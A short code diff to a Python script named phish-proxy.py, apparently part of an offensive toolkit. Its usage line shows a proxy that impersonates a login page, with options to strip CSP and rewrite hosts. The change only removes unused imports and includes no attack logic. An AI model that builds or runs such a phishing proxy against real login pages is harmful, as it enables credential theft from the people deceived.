@@ -9,7 +9,7 @@
   phish-proxy.py serve --listen :8080 --target https://login.target.com \
       [--db <数据根>/tools/phish/track.json] [--strip-csp] [--replace-host]
 """
-import sys, os, json, time, hashlib, re
+import sys, os, json, time, hashlib
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 def _data_root():
@@ -26,7 +26,7 @@ def _data_root():
     print('[warn] SPECTRE_DATA_DIR 未设置, 回退缺省数据根 /var/lib/spectre'
           '(如非本意请先设置 SPECTRE_DATA_DIR)', file=sys.stderr)
     return '/var/lib/spectre/tools'
-from urllib.parse import urlparse, parse_qs, unquote
+from urllib.parse import urlparse, parse_qs
 from urllib.request import urlopen, Request
 from urllib.error import URLError, HTTPError
 
